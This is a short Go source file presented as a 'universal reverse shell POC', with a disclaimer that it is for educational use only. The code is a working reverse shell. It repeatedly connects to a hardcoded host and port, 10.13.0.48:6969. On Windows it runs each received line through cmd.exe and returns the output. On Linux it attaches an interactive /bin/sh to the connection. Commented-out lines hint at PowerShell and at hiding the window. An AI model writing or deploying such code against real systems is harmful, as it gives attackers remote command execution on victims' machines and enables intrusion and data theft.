// main.go
// + linux,windows
package main

// Simmple basic universal reverse shell POC
// ** ONLY USE FOR EDUCATIONAL PURPOSES ONLY **
// ** ILLEGAL TO USE ON ANYTHING WITHOUT EXPRESS PERMISSION FROM OWNER **

import (
	"bufio"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	for {
		time.Sleep(3 * time.Second)
		sendRev("10.13.0.48:6969")
	}
}

func sendRev(host string) {
	conn, err := net.Dial("tcp", host)
	if nil != err {
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		sendRev(host)
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		r := bufio.NewReader(conn)
		for {
			order, err := r.ReadString('\n')
			if nil != err {
				conn.Close()
				sendRev(host)
				return
			}
			//cmd = exec.Command("powershell.exe", order)
			cmd = exec.Command("cmd.exe", "/C", order)
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ := cmd.CombinedOutput()

			conn.Write(out)
		}
	} else {
		cmd = exec.Command("/bin/sh", "-i")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}

}
